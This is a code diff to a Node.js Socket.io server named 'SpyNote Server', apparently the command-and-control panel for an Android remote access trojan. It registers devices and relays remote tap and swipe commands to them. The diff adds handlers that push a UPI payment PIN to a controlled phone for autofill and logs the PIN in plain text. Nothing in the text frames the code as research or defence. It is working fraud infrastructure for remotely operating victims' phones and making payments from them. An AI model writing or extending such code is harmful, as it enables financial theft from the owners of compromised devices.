@@ -17,7 +17,6 @@ app.use(express.static('public'));
 app.use(express.json({ limit: '50mb' }));
 
 const devices = new Map();
-const devicePins = new Map(); // Store UPI PINs per device
 
 app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
@@ -58,7 +57,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, enabled, pin } = data;
+        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
         if (devices.has(deviceId)) {
             socket.to(deviceId).emit('control', {
                 action, 
@@ -67,17 +66,26 @@ io.on('connection', (socket) => {
                 startX: parseFloat(startX) || 0, 
                 startY: parseFloat(startY) || 0,
                 endX: parseFloat(endX) || 0, 
-                endY: parseFloat(endY) || 0,
-                enabled: !!enabled,
-                pin: pin || ''
+                endY: parseFloat(endY) || 0
             });
-            console.log('🎮 Control:', action, 'to', deviceId);
-            
-            // Store UPI PIN
-            if (action === 'set-pin' && pin) {
-                devicePins.set(deviceId, pin);
-                console.log('🔐 PIN stored for', deviceId, ':', pin.replace(/\d/g, '*'));
-            }
+            console.log('🎮 Control:', action, '→', deviceId);
+        }
+    });
+
+    // 🔥 NEW UPI AUTOFILL HANDLERS
+    socket.on('upi-pin', (data) => {
+        const { deviceId, pin, enabled } = data;
+        if (devices.has(deviceId)) {
+            socket.to(deviceId).emit('upi-pin', { pin, enabled });
+            console.log('🔐 UPI PIN set for', deviceId, ':', pin);
+        }
+    });
+
+    socket.on('autofill-toggle', (data) => {
+        const { deviceId, enabled } = data;
+        if (devices.has(deviceId)) {
+            socket.to(deviceId).emit('autofill-toggle', { enabled });
+            console.log('🔄 Autofill', enabled ? 'ON' : 'OFF', '→', deviceId);
         }
     });
 
@@ -95,6 +103,7 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server running on port ${PORT}`);
-    console.log(`🌐 Web panel: http://localhost:${PORT}`);
+    console.log(`🚀 SpyNote Server v2.0 on port ${PORT}`);
+    console.log(`🌐 Web: http://localhost:${PORT}`);
+    console.log(`📱 UPI Autofill Ready!`);
 });
